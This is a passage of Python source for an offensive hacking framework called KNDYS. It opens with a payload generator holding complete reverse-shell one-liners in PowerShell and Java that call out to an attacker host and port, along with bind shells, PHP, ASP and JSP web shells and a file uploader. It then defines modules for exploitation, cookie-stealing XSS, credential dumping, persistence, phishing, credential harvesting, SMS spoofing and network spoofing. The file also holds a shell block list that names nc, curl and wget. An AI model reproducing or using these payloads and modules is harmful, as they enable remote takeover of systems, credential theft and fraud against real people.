                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
                "java": """java -e 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}} catch (Exception e){{}} }};p.destroy();s.close();'"""
            },
            
            # Bind Shells
            "bind_shell": {
                "bash": "bash -i >& /dev/tcp/{LPORT}/0.0.0.0 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "nc": "nc -lvp {LPORT} -e /bin/sh"
            },
            
            # Web Shells
            "web_shell": {
                "php": """<?php system($_GET['cmd']); ?>""",
                "php_advanced": """<?php if(isset($_REQUEST['cmd'])){{echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}} ?>""",
                "asp": """<%@ Language=VBScript %><% If Request("cmd") <> "" Then ExecuteGlobal(Request("cmd")) %>""",
                "jsp": """<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>"""
            },
            
            # Meterpreter Payloads
            "meterpreter": {
                "windows_x64": "windows/x64/meterpreter/reverse_tcp",
                "windows_x86": "windows/meterpreter/reverse_tcp",
                "linux_x64": "linux/x64/meterpreter/reverse_tcp",
                "android": "android/meterpreter/reverse_tcp"
            },
            
            # File Upload
            "file_upload": {
                "php_uploader": """<?php $uploaddir = '/tmp/'; $uploadfile = $uploaddir . basename($_FILES['file']['name']); if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) { echo "File uploaded successfully."; } else { echo "File upload failed."; } ?>"""
            }
        }
        
    def generate(self, payload_type, platform="bash", **kwargs):
        """Generate payload with substitutions"""
        if payload_type in self.payloads and platform in self.payloads[payload_type]:
            payload = self.payloads[payload_type][platform]
            for key, value in kwargs.items():
                payload = payload.replace(f"{{{key}}}", str(value))
            return payload
        return None

class KNDYSFramework:
    """Main KNDYS Framework class with enhanced security"""
    validator = InputValidator()
    SHELL_DEFAULT_ALLOWLIST = {
        'ls', 'pwd', 'whoami', 'id', 'uname', 'date', 'hostname', 'ps',
        'netstat', 'ifconfig', 'ip', 'cat', 'head', 'tail', 'grep', 'find',
        'which', 'echo', 'env', 'df', 'du', 'uptime', 'last', 'free', 'stat',
        'wc', 'cut', 'sort', 'uniq', 'tr', 'tee', 'printenv', 'lsblk', 'w',
        'who'
    }
    SHELL_BLOCKED_COMMANDS = {
        'rm', 'sudo', 'su', 'chmod', 'chown', 'chgrp', 'service', 'systemctl',
        'shutdown', 'reboot', 'halt', 'init', 'dd', 'mkfs', 'mount', 'umount',
        'scp', 'rsync', 'nc', 'nc.traditional', 'perl', 'python', 'python3',
        'ruby', 'php', 'bash', 'sh', 'zsh', 'kill', 'killall', 'pkill', 'curl',
        'wget', 'ftp', 'tftp', 'dig', 'powershell'
    }
    SHELL_INTERNAL_COMMANDS = {'history', 'stats', 'last', 'clear_history'}

    def __init__(self):
        self.current_module = None
        self.module_options = {}
        self.targets = []
        self.running = False
        self.session_id = self.generate_session_id()
        self.logger = Logger()
        self.exploit_db = ExploitDB()
        self.payload_gen = PayloadGenerator()
        self.wordlists = {}
        self.credentials = {}
        self.master_wordlists = {
            'password': Path('wordlists') / 'kndys-passwords-master.txt',
            'username': Path('wordlists') / 'kndys-usernames-master.txt'
        }
        self.master_catalog_entries = {}
        
        # Security components
        self.validator = InputValidator()
        self.rate_limiter = RateLimiter(max_requests=100, time_window=60)
        self.session_manager = SessionManager()
        self.connection_pool = ConnectionPool(max_connections=50)
        self.error_handler = ErrorHandler(self.logger)
        self._explorer_cache = OrderedDict()
        self._explorer_cache_lock = threading.Lock()
        
        self.load_config()
        self.initialize_modules()
        self.initialize_wordlists()
        
        # Start background cleanup thread
        self.cleanup_thread = threading.Thread(target=self._background_cleanup, daemon=True)
        self.cleanup_thread.start()
        
    def generate_session_id(self):
        """Generate unique session ID"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
    
    def load_config(self):
        """Load configuration"""
        self.config = {
            "lhost": self.get_local_ip(),
            "lport": 4444,
            "rhost": "",
            "rport": "",
            "threads": 50,
            "timeout": 5,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "proxy": None,
            "verbose": True
        }
    
    def _background_cleanup(self):
        """Background thread for cleanup tasks"""
        while True:
            try:
                time.sleep(300) # Every 5 minutes
                self.session_manager.cleanup_expired()
                self.logger.log("Background cleanup completed", "DEBUG")
            except Exception as e:
                self.error_handler.handle_error(e, "Background cleanup")
    
    def get_local_ip(self):
        """Get local IP address with fallback"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            self.logger.log(f"Could not determine local IP: {str(e)}", "WARNING")
            return "127.0.0.1"
    
    def display_banner(self):
        """Display KNDYS banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        print(f"{Fore.CYAN}{Style.BRIGHT}┏━━ RAPID OPS ━━┓{Style.RESET_ALL}")
        print(f"{Fore.CYAN}┃ {Fore.GREEN}help{Fore.WHITE} // decode full command index{Style.RESET_ALL}")
        print(f"{Fore.CYAN}┃ {Fore.GREEN}show modules{Fore.WHITE} // enumerate offensive vectors{Style.RESET_ALL}")
        print(f"{Fore.CYAN}┃ {Fore.GREEN}show wordlists{Fore.WHITE} // sync credential arsenals{Style.RESET_ALL}")
        print(f"{Fore.CYAN}┗{'━'*32}{Style.RESET_ALL}\n")

        missing = []
        if not NMAP_AVAILABLE:
            missing.append("python-nmap")
        if not SCAPY_AVAILABLE:
            missing.append("scapy")
        if not SSH_AVAILABLE:
            missing.append("paramiko")
        if not BS4_AVAILABLE:
            missing.append("beautifulsoup4")

        if missing:
            print(f"{Fore.RED}{Style.BRIGHT}┏━━ OPTIONAL TOOLCHAIN OFFLINE ━━┓{Style.RESET_ALL}")
            print(f"{Fore.RED}┃ Missing :: {Fore.WHITE}{', '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.RED}┃ Remedy :: {Fore.GREEN}pip install {' '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.RED}┗{'━'*44}{Style.RESET_ALL}\n")
    
    def initialize_modules(self):
        """Initialize all available modules"""
        self.modules = {
            # Reconnaissance Modules
            'recon': {
                'port_scanner': {
                    'description': 'Professional port scanner: Service detection, banner grabbing, vulnerability checks, 90+ services database',
                    'options': {
                        'target': '192.168.1.1',
                        'ports': '1-1000',
                        'threads': '50',
                        'timeout': '2',
                        'scan_type': 'tcp_connect',
                        'aggressive': 'false'
                    }
                },
                'subdomain_scanner': {
                    'description': 'Professional subdomain enumeration: DNS brute-force, Zone Transfer, Certificate Transparency, wildcard detection, HTTP verification',
                    'options': {
                        'domain': 'example.com',
                        'wordlist': '',
                        'threads': '20',
                        'techniques': 'all',
                        'verify_http': 'true',
                        'output': 'subdomains.txt'
                    }
                },
                'web_crawler': {
                    'description': 'Advanced website crawler with tech fingerprinting and vuln analytics',
                    'options': {
                        'url': 'http://example.com',
                        'depth': '3',
                        'threads': '10',
                        'max_pages': '100',
                        'respect_robots': 'true',
                        'scan_vulns': 'false',
                        'extract_js': 'true',
                        'sensitive_scan': 'true',
                        'sensitive_timeout': '3',
                        'sensitive_workers': '5'
                    }
                },
                'network_mapper': {
                    'description': 'Network discovery and mapping',
                    'options': {
                        'network': '192.168.1.0/24',
                        'scan_type': 'ping', # ping, tcp, udp, all
                        'timeout': '1',
                        'resolve_hostnames': 'true',
                        'detect_os': 'true',
                        'service_detection': 'false',
                        'topology_map': 'false',
                        'max_workers': '30'
                    }
                },
                'os_detection': {
                    'description': 'Remote OS detection using TCP/IP fingerprinting',
                    'options': {
                        'target': '192.168.1.1',
                        'deep_scan': 'false',
                        'port_scan': 'true',
                        'banner_grab': 'true',
                        'timing': 'normal', # fast, normal, slow
                        'custom_ports': '',
                        'max_ports': '60'
                    }
                }
            },
            
            # Vulnerability Scanning Modules
            'scan': {
                'vuln_scanner': {
                    'description': 'Comprehensive vulnerability scanner with 33 checks',
                    'options': {
                        'target': 'http://example.com',
                        'scan_type': 'full', # quick, web, api, full
                        'threads': '5',
                        'depth': '2',
                        'aggressive': 'false',
                        'stealth_mode': 'false'
                    }
                },
                'sql_scanner': {
                    'description': 'Advanced SQL injection scanner with exploitation',
                    'options': {
                        'url': 'http://example.com/page.php?id=1',
                        'technique': 'time_based,error_based,boolean',
                        'threads': '5'
                    }
                },
                'xss_scanner': {
                    'description': 'Cross-Site Scripting vulnerability scanner',
                    'options': {
                        'url': 'http://example.com',
                        'method': 'auto', # get, post, both, auto
                        'parameters': 'auto',
                        'scope': 'single', # single, host, crawl
                        'crawl_depth': '2',
                        'max_pages': '15',
                        'max_parameters': '40',
                        'threads': '12',
                        'mode': 'balanced', # fast, balanced, deep
                        'timeout': '8',
                        'include_forms': 'true',
                        'include_dom': 'true',
                        'stored_check': 'false',
                        'stealth': 'false',
                        'payload_limit': '0',
                        'custom_headers': '',
                        'cookies': '',
                        'rate_limit': '0'
                    }
                },
                'csrf_scanner': {
                    'description': 'Adaptive CSRF protection analyzer',
                    'options': {
                        'url': 'http://example.com',
                        'scope': 'single', # single, host, crawl
                        'mode': 'balanced', # fast, balanced, deep
                        'crawl_depth': '2',
                        'max_pages': '12',
                        'form_limit': '40',
                        'method_filter': 'all', # post, get, all
                        'threads': '8',
                        'timeout': '8',
                        'rate_limit': '0',
                        'custom_headers': '',
                        'cookies': '',
                        'check_samesite': 'true',
                        'check_referer': 'true',
                        'verify_tokens': 'true',
                        'generate_poc': 'true',
                        'sensitive_keywords': 'delete,update,password,transfer,checkout',
                        'include_get_forms': 'false'
                    }
                },
                'ssl_scanner': {
                    'description': 'Adaptive SSL/TLS analyzer',
                    'options': {
                        'target': 'example.com:443',
                        'mode': 'balanced', # fast, balanced, deep
                        'protocol_scan': 'true',
                        'cipher_scan': 'true',
                        'http_headers': 'true',
                        'ocsp': 'true',
                        'resumption': 'false',
                        'timeout': '8',
                        'retries': '2',
                        'sni': '',
                        'alpn': 'h2,http/1.1',
                        'custom_ciphers': '',
                        'rate_limit': '0'
                    }
                },
                'dir_traversal': {
                    'description': 'Directory traversal vulnerability scanner',
                    'options': {
                        'url': 'http://example.com/download?file=FUZZ',
                        'method': 'get',
                        'parameter': 'file',
                        'marker': 'FUZZ',
                        'depth': '6',
                        'payload_profile': 'balanced',
                        'encodings': 'standard,url,double,nullbyte,win',
                        'platform': 'auto',
                        'wordlist': '',
                        'threads': '10',
                        'timeout': '6',
                        'allow_redirects': 'false',
                        'verify_ssl': 'false',
                        'sensitive_only': 'false',
                        'interesting_status': '200,206,403,500',
                        'custom_headers': '',
                        'post_data': '',
                        'retry_failed': 'true'
                    }
                }
            },
            
            # Exploitation Modules
            'exploit': {
                'multi_handler': {
                    'description': 'Multi/handler for receiving reverse connections',
                    'options': {
                        'lhost': self.config['lhost'],
                        'lport': '4444',
                        'transport': 'tcp',
                        'payload': 'raw_reverse_shell',
                        'banner': 'KNDYS multi-handler ready',
                        'auto_command': '',
                        'stage_payload': '',
                        'stage_port': '0',
                        'stage_mime': 'application/octet-stream',
                        'max_sessions': '12',
                        'idle_timeout': '900',
                        'record_sessions': 'true',
                        'session_log': 'handler_sessions',
                        'encoding': 'utf-8',
                        'keepalive_interval': '45',
                        'keepalive_payload': 'PING',
                        'http_logging': 'false',
                        'ssl_cert': '',
                        'ssl_key': '',
                        'backlog': '50',
                        'command_timeout': '6'
                    }
                },
                'sql_injection': {
                    'description': 'SQL injection exploitation tool',
                    'options': {
                        'url': 'http://example.com/vuln.php?id=1',
                        'method': 'auto',
                        'body': '',
                        'parameters': 'auto',
                        'injection_location': 'auto',
                        'techniques': 'boolean,union,error,time',
                        'max_depth': '6',
                        'max_payloads': '12',
                        'max_total_payloads': '120',
                        'threads': '8',
                        'timeout': '8',
                        'throttle': '0',
                        'verify_ssl': 'false',
                        'length_threshold': '120',
                        'delay_threshold': '3',
                        'custom_headers': '',
                        'cookies': '',
                        'proxies': ''
                    }
                },
                'xss_exploit': {
                    'description': 'XSS exploitation with cookie stealing',
                    'options': {
                        'url': 'http://example.com/search.php?q=',
                        'method': 'auto',
                        'parameters': 'auto',
                        'body': '',
                        'injection_location': 'auto',
                        'payload_profile': 'balanced',
                        'custom_payload': '',
                        'encoder': 'none',
                        'max_payloads': '12',
                        'max_total_payloads': '60',
                        'threads': '6',
                        'timeout': '8',
                        'throttle': '0',
                        'verify_ssl': 'false',
                        'auto_verify': 'true',
                        'start_listener': 'false',
                        'listener_host': self.config['lhost'],
                        'listener_port': '9090',
                        'listener_token': '',
                        'beacon_endpoint': '',
                        'rate_limit': '0',
                        'custom_headers': '',
                        'cookies': '',
                        'proxies': '',
                        'report_prefix': 'xss_exploit'
                    }
                },
                'command_injection': {
                    'description': 'Command injection exploitation',
                    'options': {
                        'url': 'http://example.com/cmd.php?cmd=whoami',
                        'method': 'auto',
                        'parameters': 'auto',
                        'body': '',
                        'injection_location': 'auto',
                        'os_profile': 'auto',
                        'attack_modes': 'detect,blind,enumeration',
                        'confirm_command': 'whoami',
                        'custom_payload': '',
                        'encoder': 'none',
                        'max_payloads': '10',
                        'max_total_payloads': '60',
                        'threads': '4',
                        'timeout': '8',
                        'throttle': '0',
                        'blind_delay': '5',
                        'verify_ssl': 'false',
                        'response_indicators': 'uid=,gid=,root:,windows ip,volume in drive',
                        'success_regex': 'uid=|gid=|www-data|administrator|system32',
                        'rate_limit': '0',
                        'custom_headers': '',
                        'cookies': '',
                        'proxies': '',
                        'report_prefix': 'command_injection'
                    }
                },
                'file_upload': {
                    'description': 'File upload vulnerability exploitation',
                    'options': {
                        'url': 'http://example.com/upload.php',
                        'method': 'post',
                        'parameter': 'file',
                        'extra_fields': '',
                        'payload_profile': 'balanced',
                        'custom_payload': '',
                        'webshell_type': 'php',
                        'max_payloads': '6',
                        'verify_paths': 'auto',
                        'auto_shell_verify': 'true',
                        'shell_param': 'cmd',
                        'shell_command': 'id',
                        'shell_success_indicators': 'uid=,www-data,nt authority',
                        'success_keywords': 'upload success,file uploaded,saved to,stored at',
                        'allow_status': '200,201,202,204,302',
                        'threads': '4',
                        'timeout': '12',
                        'verify_timeout': '6',
                        'throttle': '0',
                        'verify_ssl': 'false',
                        'rate_limit': '0',
                        'custom_headers': '',
                        'cookies': '',
                        'proxies': '',
                        'report_prefix': 'file_upload'
                    }
                },
                'buffer_overflow': {
                    'description': 'Buffer overflow exploitation framework',
                    'options': {
                        'target': '192.168.1.100:9999',
                        'protocol': 'tcp',
                        'command_template': 'TRUN /.:/{{PAYLOAD}}\\r\\n',
                        'payload_strategy': 'progressive,cyclic',
                        'start_length': '256',
                        'max_length': '4096',
                        'step_length': '256',
                        'cyclic_length': '2048',
                        'max_payloads': '12',
                        'custom_lengths': '',
                        'custom_payloads': '',
                        'encoding': 'latin-1',
                        'connection_timeout': '3',
                        'response_timeout': '3',
                        'settle_delay': '0.8',
                        'max_retries': '1',
                        'crash_indicators': 'connection reset,connection closed,no response',
                        'stop_on_crash': 'true',
                        'offset_value': '',
                        'threads': '1',
                        'report_prefix': 'buffer_overflow'
                    }
                }
            },
            
            # Post-Exploitation Modules
            'post': {
                'shell': {
                    'description': 'Interactive system shell',
                    'options': {
                        'session': '1',
                        'command': 'whoami',
                        'mode': 'interactive',
                        'timeout': '10',
                        'throttle': '0',
                        'cwd': '.',
                        'history_limit': '50',
                        'history_capture': '512',
                        'record_transcript': 'true',
                        'transcript_path': '',
                        'allow_commands': '',
                        'deny_commands': '',
                        'commands': '',
                        'env': ''
                    }
                },
                'file_explorer': {
                    'description': 'Remote file system explorer',
                    'options': {
                        'session': '1',
                        'path': '/',
                        'root': '/',
                        'mode': 'list',
                        'max_depth': '2',
                        'max_entries': '200',
                        'include_hidden': 'false',
                        'pattern': '',
                        'pattern_mode': 'glob',
                        'file_types': 'all',
                        'min_size': '0',
                        'max_size': '0',
                        'sort_by': 'name',
                        'sort_order': 'asc',
                        'hash_files': 'false',
                        'hash_limit': '65536',
                        'preview': 'false',
                        'preview_bytes': '512',
                        'follow_links': 'false',
                        'worker_threads': '4',
                        'cache_ttl': '5',
                        'export_prefix': 'file_explorer',
                        'allow_outside_root': 'false'
                    }
                },
                'privilege_escalation': {
                    'description': 'Automated privilege escalation checks',
                    'options': {
                        'session': '1',
                        'checks': 'suid,writable,path,cron,sudo,docker,kernel',
                        'max_items': '50',
                        'max_workers': '4',
                        'include_home': 'true',
                        'suid_paths': '/bin,/sbin,/usr/bin,/usr/sbin',
                        'additional_paths': '',
                        'writable_paths': '/tmp,/var/tmp,/dev/shm',
                        'path_override': '',
                        'custom_env_path': '',
                        'cron_paths': '/etc/crontab,/etc/cron.d,/var/spool/cron',
                        'allow_sudo': 'false',
                        'sudo_timeout': '4',
                        'collect_references': 'true',
                        'report_prefix': 'privesc',
                        'cache_ttl': '0'
                    }
                },
                'credential_dumper': {
                    'description': 'Extract credentials from compromised system',
                    'options': {
                        'session': '1',
                        'os': 'windows'
                    }
                },
                'persistence': {
                    'description': 'Establish persistence on compromised system',
                    'options': {
                        'session': '1',
                        'method': 'service'
                    }
                },
                'pivot': {
                    'description': 'Network pivoting and lateral movement',
                    'options': {
                        'session': '1',
                        'target': '192.168.2.0/24'
                    }
                }
            },
            
            # Password Attacks
            'password': {
                'brute_force': {
                    'description': 'Password brute force attacks',
                    'options': {
                        'target': 'ssh://192.168.1.1:22',
                        'username': 'admin',
                        'wordlist': 'passwords.txt',
                        'service': 'ssh'
                    }
                },
                'hash_cracker': {
                    'description': 'Hash cracking with multiple algorithms',
                    'options': {
                        'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
                        'type': 'md5',
                        'wordlist': 'rockyou.txt',
                        'hash_file': '',
                        'password_profile': 'core',
                        'salt': '',
                        'salt_position': 'suffix',
                        'encoding': 'utf-8',
                        'mask': '',
                        'mask_limit': '250000',
                        'heuristic_limit': '5000',
                        'max_workers': '8',
                        'chunk_size': '1000',
                        'case_sensitive': 'true',
                        'smart_rules': 'true',
                        'rate_limit': '0',
                        'max_runtime': '0',
                        'progress_interval': '5',
                        'dedup_limit': '200000',
                        'audit_log': 'hash_cracker_audit.log'
                    }
                },
                'spray_attack': {
                    'description': 'Password spray attack',
                    'options': {
                        'target': 'owa.example.com',
                        'usernames': 'users.txt',
                        'passwords': 'passwords.txt',
                        'delay': '10'
                    }
                },
                'credential_stuffing': {
                    'description': 'Credential stuffing attack',
                    'options': {
                        'target': 'http://example.com/login',
                        'credentials': 'creds.txt',
                        'threads': '5'
                    }
                }
            },
            
            # Wireless Modules
            'wireless': {
                'wifi_scanner': {
                    'description': 'WiFi network scanner',
                    'options': {
                        'interface': 'wlan0',
                        'channel': 'all'
                    }
                },
                'wifi_cracker': {
                    'description': 'WPA/WPA2 handshake cracker',
                    'options': {
                        'handshake': 'capture.pcap',
                        'wordlist': 'rockyou.txt',
                        'bssid': '00:11:22:33:44:55'
                    }
                },
                'rogue_ap': {
                    'description': 'Rogue access point creator',
                    'options': {
                        'interface': 'wlan0',
                        'ssid': 'Free_WiFi',
                        'channel': '6'
                    }
                }
            },
            
            # Social Engineering
            'social': {
                'phishing': {
                    'description': 'Advanced phishing campaign manager with templates, tracking & analytics',
                    'options': {
                        'template': 'office365',
                        'targets': 'emails.txt',
                        'smtp_server': 'smtp.gmail.com',
                        'smtp_port': '587',
                        'smtp_user': '',
                        'smtp_password': '',
                        'from_email': '',
                        'from_name': 'IT Support',
                        'reply_to': '',
                        'campaign_name': 'phishing_campaign',
                        'subject': '',
                        'phish_url': 'http://localhost:8080',
                        'use_tls': 'true',
                        'use_ssl': 'false',
                        'track_opens': 'true',
                        'track_clicks': 'true',
                        'personalize': 'true',
                        'validate_emails': 'true',
                        'threads': '5',
                        'rate_limit': '10',
                        'delay_min': '1',
                        'delay_max': '5',
                        'attachment': '',
                        'attachment_name': '',
                        'db_file': 'phishing_campaign.db',
                        'export_results': 'true',
                        'export_format': 'all',
                        'auto_execute': 'false'
                    }
                },
                'credential_harvester': {
                    'description': 'Professional credential harvester with 15 templates, database, fingerprinting',
                    'options': {
                        'port': '8080',
                        'template': 'facebook',
                        'redirect_url': 'https://facebook.com',
                        'redirect_delay': '3',
                        'db_path': 'harvester_creds.db',
                        'log_file': 'harvester.log',
                        'enable_ssl': 'false',
                        'ssl_cert': '',
                        'ssl_key': '',
                        'capture_screenshots': 'false',
                        'enable_fingerprinting': 'true',
                        'enable_geolocation': 'true',
                        'email_notifications': 'false',
                        'smtp_server': '',
                        'smtp_port': '587',
                        'smtp_user': '',
                        'smtp_pass': '',
                        'notify_email': '',
                        'session_timeout': '3600',
                        'max_attempts': '3',
                        'custom_title': '',
                        'custom_message': ''
                    }
                },
                'website_cloner': {
                    'description': 'Advanced website cloner with injection',
                    'options': {
                        'url': 'https://facebook.com',
                        'output': 'phish_site',
                        'inject_keylogger': 'false'
                    }
                },
                'mass_mailer': {
                    'description': 'Enterprise mass email campaign manager with templates, scheduling & analytics',
                    'options': {
                        # SMTP Configuration
                        'smtp_server': 'smtp.gmail.com',
                        'smtp_port': '587',
                        'smtp_user': '',
                        'smtp_password': '',
                        'use_tls': 'true',
                        'use_ssl': 'false',
                        
                        # Email Settings
                        'from_email': '',
                        'from_name': 'Newsletter Team',
                        'reply_to': '',
                        'subject': '',
                        'preheader': '',
                        
                        # Campaign Settings
                        'campaign_name': 'mass_campaign',
                        'template': 'newsletter',
                        'targets': 'targets.csv',
                        'phish_url': 'http://localhost:8080',
                        
                        # Templates & Personalization
                        'personalize': 'true',
                        'validate_emails': 'true',
                        'use_html': 'true',
                        'unsubscribe_link': 'true',
                        
                        # Tracking
                        'track_opens': 'true',
                        'track_clicks': 'true',
                        'track_unsubscribes': 'true',
                        
                        # Performance
                        'threads': '10',
                        'rate_limit': '50',
                        'delay_min': '0.5',
                        'delay_max': '2',
                        'batch_size': '100',
                        
                        # Attachments
                        'attachments': '',
                        'inline_images': '',
                        
                        # Scheduling
                        'schedule_time': '',
                        'send_now': 'true',
                        'recurring': 'false',
                        'recurring_interval': 'weekly',
                        
                        # Database
                        'db_file': 'mass_mailer.db',
                        
                        # Export & Reporting
                        'export_results': 'true',
                        'export_format': 'all',
                        'generate_report': 'true',
                        
                        # A/B Testing
                        'ab_testing': 'false',
                        'ab_variants': '2',
                        
                        # Retry & Bounce Handling
                        'retry_failed': 'true',
                        'max_retries': '3',
                        'bounce_handling': 'true',
                        
                        # Testing
                        'auto_execute': 'false',
                        'test_mode': 'false',
                        'test_recipients': ''
                    }
                },
                'qr_generator': {
                    'description': 'Malicious QR code generator',
                    'options': {
                        'url': 'http://malicious-site.com',
                        'output': 'qr_code.png',
                        'size': '300'
                    }
                },
                'usb_payload': {
                    'description': 'USB payload generator (BadUSB/Rubber Ducky)',
                    'options': {
                        'payload_type': 'reverse_shell',
                        'target_os': 'windows',
                        'lhost': self.config['lhost'],
                        'lport': '4444',
                        'output': 'payload.txt'
                    }
                },
                'fake_update': {
                    'description': 'Fake software update page generator',
                    'options': {
                        'software': 'chrome',
                        'payload': 'update.exe',
                        'port': '8080'
                    }
                },
                'sms_spoofing': {
                    'description': 'SMS spoofing campaign with Twilio integration',
                    'options': {
                        'message': 'Your package is ready. Track: {link}',
                        'sender': 'DHL',
                        'targets': 'phones.txt',
                        'twilio_sid': '',
                        'twilio_token': '',
                        'twilio_number': '',
                        'link': 'http://track.example.com/123',
                        'delay': '2'
                    }
                },
                'pretexting': {
                    'description': 'Pretexting scenario generator',
                    'options': {
                        'scenario': 'it_support',
                        'company': 'TechCorp',
                        'urgency': 'high'
                    }
                }
            },
            
            # Network Attacks
            'network': {
                'arp_spoof': {
                    'description': 'ARP spoofing / Man-in-the-Middle attack',
                    'options': {
                        'target_ip': '192.168.1.100',
                        'gateway_ip': '192.168.1.1',
                        'interface': 'eth0'
                    }
                },
                'dns_spoof': {
                    'description': 'DNS spoofing attack',
                    'options': {
                        'domain': 'google.com',
                        'fake_ip': '192.168.1.100',
                        'interface': 'eth0'
                    }
                },
                'dhcp_starvation': {
                    'description': 'DHCP starvation attack',
                    'options': {
                        'interface': 'eth0',
                        'count': '100'
                    }
                },
                'ssl_strip': {
                    'description': 'SSL stripping attack',
                    'options': {
                        'interface': 'eth0',
                        'port': '8080'
                    }
                },
                'packet_sniffer': {
                    'description': 'Advanced packet sniffer with filters',
                    'options': {
                        'interface': 'eth0',
                        'filter': 'tcp port 80',
                        'output': 'capture.pcap',
                        'count': '100'
                    }
                }
            },
            
            # Web Application Testing
            'webapp': {
                'jwt_cracker': {
                    'description': 'JSON Web Token security tester',
                    'options': {
                        'token': '',
                        'wordlist': 'secrets.txt',
                        'algorithm': 'HS256'
                    }
                },
                'api_fuzzer': {
                    'description': 'REST API fuzzer and tester',
                    'options': {
                        'url': 'https://api.example.com',
                        'method': 'POST',
                        'endpoints': 'endpoints.txt'
                    }
                },
                'cors_scanner': {
                    'description': 'CORS misconfiguration scanner',
                    'options': {
                        'url': 'https://example.com',
                        'origin': 'https://evil.com'
                    }
                },
                'nosql_injection': {
                    'description': 'NoSQL injection tester (MongoDB, CouchDB)',
                    'options': {
                        'url': 'http://example.com/api',
                        'parameter': 'username',
                        'technique': 'auth_bypass'
                    }
                },
                'graphql_introspection': {
                    'description': 'GraphQL schema introspection',
                    'options': {
                        'url': 'https://api.example.com/graphql',
                        'output': 'schema.json'
                    }
                }
            },
            
            # Reporting
            'report': {
                'report_generator': {
                    'description': 'Generate professional pentest reports',
                    'options': {
                        'format': 'html',
                        'template': 'default',
                        'output': 'pentest_report'
                    }
                },
                'evidence_collector': {
                    'description': 'Collect evidence and screenshots',
                    'options': {
                        'session': '1',
                        'output': 'evidence.zip'
                    }
                }
            }
        }
    
    def _load_bundled_wordlist_file(self, filename, fallback=None):
        base_dir = Path('wordlists')
        path = base_dir / filename
        entries = []
        if path.exists():
            try:
                with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                    entries = [line.strip() for line in fh if line.strip()]
            except (OSError, UnicodeError):
                entries = []
        if not entries and fallback:
            return list(fallback)
        return entries

    @staticmethod
    def _format_wordlist_size(path):
        try:
            size = path.stat().st_size
        except OSError:
            return 'n/a'
        if size >= 1024 * 1024:
            return f"{size / (1024 * 1024):.1f} MB"
        if size >= 1024:
            return f"{size / 1024:.1f} KB"
        return f"{size} B"

    def _create_bundled_wordlist_entry(self, category, filename, aliases, description):
        base_dir = Path('wordlists')
        path = base_dir / filename
        alias_map = {}
        for alias in aliases:
            alias_str = str(alias).strip()
            if alias_str:
                alias_map.setdefault(alias_str.lower(), alias_str)
        alias_map.setdefault(path.stem.lower(), path.stem)
        entry = {
            'category': category,
            'name': filename,
            'aliases': list(alias_map.values()),
            'url': '',
            'compressed': None,
            'extract': None,
            'size': self._format_wordlist_size(path),
            'description': description,
            'bundled': True,
            'path': path,
            'available': path.exists()
        }
        return entry

    def _register_master_wordlists(self):
        if not hasattr(self, 'wordlists'):
            return
        descriptions = {
            'password': 'Aggregated union of all bundled and downloaded password lists.',
            'username': 'Aggregated union of all bundled and downloaded username lists.'
        }
        alias_map = {
            'password': ['kndys-passwords-master', 'kndys-all-passwords', 'password-master', 'all-passwords'],
            'username': ['kndys-usernames-master', 'kndys-all-usernames', 'username-master', 'all-usernames']
        }
        catalog = self.wordlists.get('wordlist_catalog', [])
        index = self.wordlists.get('wordlist_index', {})
        for category, path in self.master_wordlists.items():
            if category in self.master_catalog_entries:
                self._refresh_master_wordlist_entry(category)
                continue
            aliases = alias_map.get(category, [path.stem])
            entry = self._create_bundled_wordlist_entry(category, path.name, aliases, descriptions.get(category, 'Aggregated wordlist.'))
            entry['path'] = path
            entry['available'] = Path(path).exists()
            entry['size'] = self._format_wordlist_size(Path(path)) if entry['available'] else 'n/a'
            entry['bundled'] = True
            catalog.insert(0, entry)
            for alias in entry['aliases']:
                alias_key = alias.lower()
                idx_entry = index.setdefault(alias_key, {})
                idx_entry[category] = entry
            self.master_catalog_entries[category] = entry

    def _refresh_master_wordlist_entry(self, category):
        entry = self.master_catalog_entries.get(category)
        if not entry:
            return
        path = Path(entry['path'])
        if path.exists():
            entry['available'] = True
            entry['size'] = self._format_wordlist_size(path)
        else:
            entry['available'] = False
            entry['size'] = 'n/a'

